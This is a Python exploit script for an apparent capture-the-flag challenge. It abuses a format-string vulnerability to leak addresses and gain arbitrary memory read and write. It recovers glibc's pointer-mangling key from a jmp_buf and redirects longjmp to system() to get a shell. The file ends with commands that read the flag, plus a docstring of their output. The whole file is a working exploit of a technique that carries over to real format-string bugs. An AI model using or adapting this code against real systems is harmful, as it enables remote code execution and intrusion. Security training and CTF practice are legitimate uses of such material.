#!/usr/bin/env python3
import socket
import sys
import struct
import time


s = socket.create_connection(('finale-challs.rtfm.re', 6666)) ; PRINTF_OFF = 0x58770 ; SYSTEM_OFFSET = 0x44c50  # noqa


def ror64(x, shift):
    return (x >> shift) | ((x << (64-shift)) & 0xffffffffffffffff)


def rol64(x, shift):
    return ror64(x, 64 - shift)


def recv(panic_if_close=True):
    data = s.recv(4096)
    print("\033[34m[<] %r\033[m" % (data.replace(b'                     ', b'..')))
    if not data:
        print("CLOSED")
        sys.exit(1)
    assert data, "closed :("
    return data


def recv_until_prompts(prompts):
    data = b''
    while True:
        data += recv(panic_if_close=True)
        for p in prompts:
            if p in data:
                return data


def do_printf(fmt, end=b'\n'):
    print("[>] Format %r" % fmt)
    s.send(fmt.encode() + b'\n')
    data = recv_until_prompts((end,))
    return data


def do_printfb(fmt, end=b'\n'):
    print("[>] Format-bin %r" % fmt)
    s.send(fmt + b'\n')
    data = recv_until_prompts((end,))
    return data


def p64(addr):
    return struct.pack('<Q', addr)


recv_until_prompts((b'Gl HF\n',))
leaked = do_printf('%p:' * 64 + 'EE', end=b'EE').decode().rstrip('E').split(':')
for i, x in enumerate(leaked):
    print("%2d: %s" % (i, x))


BASE_ADDR = int(leaked[31].split('0x')[1], 16) - 0x5652aec06c80 + 0x5652aec06000
print("BASE_ADDR = %#x" % BASE_ADDR)

data = do_printfb(b"%8$#lx         :" + p64(BASE_ADDR), end=b':')
assert data.decode() == '0x%x         :' % BASE_ADDR


def read_atmost8(addr):
    data = do_printfb(b"%8$#.8s::::__:::" + p64(addr), end=b':::__:::')
    # assert data.endswith(b'::::__:::')
    data = data[:data.rindex(b'::::__:::')]
    return data


def read_precise(addr, size):
    data = b''
    while len(data) < size:
        new_data = read_atmost8(addr + len(data))
        if not new_data:
            data += b'\0'
        else:
            data += new_data
    return data[:size]


def read_u64(addr):
    return struct.unpack('<Q', read_precise(addr, 8))[0]


def write_byte(addr, value):
    value = (value % 256) + 256
    do_printfb(b"%" + (str(value).encode()) + b"d%8$hhn::::_" + p64(addr), end=b':_')


def write_bytes(addr, data):
    for i, x in enumerate(data):
        write_byte(addr + i, x)


def write_u64(addr, value):
    write_bytes(addr, struct.pack('<Q', value))


printf_addr = read_u64(BASE_ADDR + 0x201F90)
print("printf_addr = %#x" % printf_addr)
LIBC_ADDR = printf_addr - PRINTF_OFF
print("LIBC_ADDR = %#x" % LIBC_ADDR)

jmpbuf_addr = read_u64(BASE_ADDR + 0x202018)
print("jmp buffer at %#x" % jmpbuf_addr)

libc_system_addr = LIBC_ADDR + SYSTEM_OFFSET

if 0:
    # For testing
    jmp_buffer_content = [read_u64(jmpbuf_addr + 8 * i) for i in range(8)]
    for i, a in enumerate(jmp_buffer_content):
        print("- jmp[%d] = %#x" % (i, a))

    """
    mov    0x30(%rdi),%r8       => rsp
    mov    0x8(%rdi),%r9        => rbp
    mov    0x38(%rdi),%rdx      => jump
    ror    $0x11,%r8
    xor    %fs:0x30,%r8
    ror    $0x11,%r9
    xor    %fs:0x30,%r9
    ror    $0x11,%rdx
    xor    %fs:0x30,%rdx

    mov    %esi,%eax
    mov    %r8,%rsp
    mov    %r9,%rbp
    jmpq   *%rdx
    """
    xor_key_fs30 = ror64(jmp_buffer_content[7], 17) ^ (BASE_ADDR + 0xa5c)
    print("XOR key = %#x" % xor_key_fs30)
    print("rbp = %#x" % (ror64(jmp_buffer_content[1], 17) ^ xor_key_fs30))
    print("rsp = %#x" % (ror64(jmp_buffer_content[6], 17) ^ xor_key_fs30))
    print("rip = %#x (expected %#x + 0xa5c)" % (ror64(jmp_buffer_content[7], 17) ^ xor_key_fs30, BASE_ADDR))
    write_u64(jmpbuf_addr + 8*7, rol64(xor_key_fs30 ^ libc_system_addr, 17))
else:
    jmp_buffer_content_7 = read_u64(jmpbuf_addr + 8 * 7)
    xor_key_fs30 = ror64(jmp_buffer_content_7, 17) ^ (BASE_ADDR + 0xa5c)
    print("XOR key = %#x" % xor_key_fs30)
    print("rip = %#x (expected %#x + 0xa5c)" % (ror64(jmp_buffer_content_7, 17) ^ xor_key_fs30, BASE_ADDR))
    write_u64(jmpbuf_addr + 8*7, rol64(xor_key_fs30 ^ libc_system_addr, 17))

sh_addr = jmpbuf_addr
write_bytes(sh_addr, b'/bin/sh\0')

print("Targetting %#x" % (libc_system_addr))

print("SLEEPING")
time.sleep(1)
s.send(b'q\n')

do_printf('id')
do_printf('pwd')
do_printf('ls . /')
do_printf('ls /home/longjmp')
do_printf('cat /home/longjmp/flag.txt')


"""
>>> do_printf('ls /home')
[>] Format 'ls /home'
[<] b'longjmp\n'
b'longjmp\n'
>>> do_printf('ls /home/longjmp')
[>] Format 'ls /home/longjmp'
[<] b'flag.txt\nlongjmp\n'
b'flag.txt\nlongjmp\n'
>>> do_printf('cat /home/longjmp/flag.txt')
[>] Format 'cat /home/longjmp/flag.txt'
[<] b'sigsegv{lolItWasASigsegv1UnreleasedChall}\n'
b'sigsegv{lolItWasASigsegv1UnreleasedChall}\n'
"""
